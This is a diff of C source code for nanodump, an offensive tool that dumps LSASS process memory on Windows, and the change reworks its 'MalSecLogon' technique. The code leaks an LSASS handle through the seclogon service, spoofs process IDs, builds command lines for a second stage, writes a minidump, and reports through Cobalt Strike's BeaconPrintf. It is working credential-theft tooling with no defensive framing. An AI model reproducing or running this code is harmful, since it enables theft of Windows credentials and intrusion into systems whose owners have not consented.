@@ -78,9 +78,9 @@ void change_pid(DWORD new_pid, PDWORD previous_pid)
 void set_command_line(
     LPWSTR command_line,
     LPCSTR program_name,
-    LPCSTR dump_name,
-    BOOL fork,
-    BOOL valid
+    LPCSTR dump_path,
+    BOOL fork_lsass,
+    BOOL use_valid_sig
 )
 {
     // program path
@@ -90,18 +90,18 @@ void set_command_line(
     wcsncat(command_line, program_name_w, MAX_PATH);
     wcsncat(command_line, L"\"", MAX_PATH);
     // dump path
-    wchar_t dump_name_w[MAX_PATH];
-    mbstowcs(dump_name_w, dump_name, MAX_PATH);
+    wchar_t dump_path_w[MAX_PATH];
+    mbstowcs(dump_path_w, dump_path, MAX_PATH);
     wcsncat(command_line, L" -w ", MAX_PATH);
-    wcsncat(command_line, dump_name_w, MAX_PATH);
+    wcsncat(command_line, dump_path_w, MAX_PATH);
     // --fork
-    if (fork)
+    if (fork_lsass)
         wcsncat(command_line, L" -f", MAX_PATH);
     // valid
-    if (valid)
+    if (use_valid_sig)
         wcsncat(command_line, L" -v", MAX_PATH);
-    // seclogon
-    wcsncat(command_line, L" --seclogon", MAX_PATH);
+    // malseclogon
+    wcsncat(command_line, L" -m", MAX_PATH);
     // --stage 2
     wcsncat(command_line, L" --stage2", MAX_PATH);
 }
@@ -127,11 +127,14 @@ BOOL save_new_process_pid(PPROCESS_LIST process_list, DWORD pid)
 }
 
 // wait until the process exits and check if the dumpfile exists
-BOOL check_if_succeded(DWORD pid, LPCSTR dump_name)
+BOOL check_if_succeded(
+    DWORD new_pid,
+    LPCSTR dump_path
+)
 {
     // we cannot call WaitForSingleObject on the returned handle in startInfo because the handles are duped into lsass process, we need a new handle
     HANDLE hSpoofedProcess = get_process_handle(
-        pid,
+        new_pid,
         SYNCHRONIZE,
         FALSE
     );
@@ -143,18 +146,107 @@ BOOL check_if_succeded(DWORD pid, LPCSTR dump_name)
         return FALSE;
 
     NtClose(hSpoofedProcess); hSpoofedProcess = NULL;
-    if (!file_exists(dump_name))
+    if (!file_exists(dump_path))
         return FALSE;
 
     return TRUE;
 }
 
-BOOL seclogon_stage_1(
+void kill_created_processes(
+    PPROCESS_LIST created_processes
+)
+{
+    if (!created_processes)
+        return;
+
+    for (DWORD i = 0; i < created_processes->Count; i++)
+    {
+        kill_process(created_processes->ProcessId[i]);
+    }
+    intFree(created_processes); created_processes = NULL;
+}
+
+/*
+ * MalSecLogon can be used agains nanodump itself (writing it to disk)
+ * or use a another binary (like notepad.exe) and duplicate
+ * the leaked handle in order to remain fileless
+ */
+BOOL MalSecLogon(
+    LPCSTR binary_path,
+    LPCSTR dump_path,
+    BOOL fork_lsass,
+    BOOL use_valid_sig,
+    BOOL use_malseclogon_locally,
+    DWORD lsass_pid,
+    PPROCESS_LIST* Pcreated_processes
+)
+{
+    PPROCESS_LIST created_processes;
+    BOOL success;
+
+#ifdef BOF
+    BeaconPrintf(CALLBACK_OUTPUT,
+#else
+    printf(
+#endif
+        "[!] MalSecLogon implementation is unstable, errors are to be expected\n"
+    );
+    // if MalSecLogon is used to create other processes, save their PID
+    if (!use_malseclogon_locally)
+    {
+        created_processes = intAlloc(sizeof(PROCESS_LIST));
+        if (!created_processes)
+        {
+            *Pcreated_processes = NULL;
+            malloc_failed();
+            return FALSE;
+        }
+        *Pcreated_processes = created_processes;
+    }
+    // leak an LSASS handle using MalSecLogon
+    success = malseclogon_stage_1(
+        binary_path,
+        dump_path,
+        fork_lsass,
+        use_valid_sig,
+        use_malseclogon_locally,
+        lsass_pid,
+        created_processes
+    );
+    if (!success)
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_OUTPUT,
+#else
+        printf(
+#endif
+            "MalSecLogon technique failed!\n"
+        );
+        if (created_processes)
+        {
+            intFree(created_processes); created_processes = NULL;
+            *Pcreated_processes = NULL;
+        }
+        return FALSE;
+    }
+    if (use_malseclogon_locally)
+    {
+        // MalSecLogon created a new nanodump process which created the dump
+        print_success(
+            dump_path,
+            use_valid_sig,
+            TRUE
+        );
+    }
+    return TRUE;
+}
+
+BOOL malseclogon_stage_1(
     LPCSTR program_name,
-    LPCSTR dump_name,
-    BOOL fork,
-    BOOL valid,
-    BOOL use_seclogon_locally,
+    LPCSTR dump_path,
+    BOOL fork_lsass,
+    BOOL use_valid_sig,
+    BOOL use_malseclogon_locally,
     DWORD lsass_pid,
     PPROCESS_LIST process_list
 )
@@ -163,9 +255,9 @@ BOOL seclogon_stage_1(
     PHANDLE_LIST handle_list;
 
     // if the file already exists, delete it
-    if (file_exists(dump_name))
+    if (file_exists(dump_path))
     {
-        if (!delete_file(dump_name))
+        if (!delete_file(dump_path))
         {
             return FALSE;
         }
@@ -175,9 +267,9 @@ BOOL seclogon_stage_1(
     set_command_line(
         command_line,
         program_name,
-        dump_name,
-        fork,
-        valid
+        dump_path,
+        fork_lsass,
+        use_valid_sig
     );
 
     handle_list = find_process_handles_in_lsass(
@@ -276,11 +368,11 @@ BOOL seclogon_stage_1(
         }
 
         // if MalSecLogon was used against nanodump, check if the minidump was created
-        if (use_seclogon_locally)
+        if (use_malseclogon_locally)
         {
             success = check_if_succeded(
                 procInfo.dwProcessId,
-                dump_name
+                dump_path
             );
             if (success)
             {
@@ -290,17 +382,24 @@ BOOL seclogon_stage_1(
             }
         }
     }
+
     // restore the original PID
     change_pid(original_pid, NULL);
     intFree(handle_list); handle_list = NULL;
-    if (use_seclogon_locally)
+    if (use_malseclogon_locally)
+    {
+        // the new nanodump process was unable to create the minidump
         return FALSE;
+    }
     else
+    {
+        // all the processes with the leaked handles have been created
         return TRUE;
+    }
 }
 
 #ifndef BOF
-HANDLE seclogon_stage_2(
+HANDLE malseclogon_stage_2(
     LPCSTR dump_path
 )
 {
